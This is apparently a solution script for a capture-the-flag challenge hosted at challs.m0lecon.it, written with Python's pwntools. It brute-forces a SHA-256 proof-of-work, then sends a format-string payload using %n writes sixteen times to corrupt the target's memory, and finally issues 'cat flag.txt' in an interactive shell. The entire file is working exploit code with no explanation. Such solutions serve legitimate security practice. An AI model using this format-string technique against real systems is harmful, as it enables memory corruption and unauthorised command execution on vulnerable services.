#!/usr/bin/env python3

from pwn import *
from hashlib import sha256
import string

def pow_solver(string, correct):
    i = 0
    correct = correct.decode()
    while True:
        test = string + str(i).encode()
        _hash = sha256(test).hexdigest()[59:]
        i += 1

        if _hash == correct:
            return test

def main():
    p = remote('challs.m0lecon.it', 5556)

    _pow = p.recvline().split(b' ')

    stringStart = _pow[6]
    correct = _pow[13][:-2]

    solution = pow_solver(stringStart, correct)

    p.sendline(solution)

    for i in range(16):
        p.recvline()
        pad = p.recvline().split(b'to ')[1][:-2].decode()

        payload = "%{}c%7$*9$c%8$n\n".format(pad)

        p.send(payload)
        p.recvline()

    p.sendline("cat flag.txt")
    p.interactive()

    p.close()

if __name__ == "__main__":
    main()
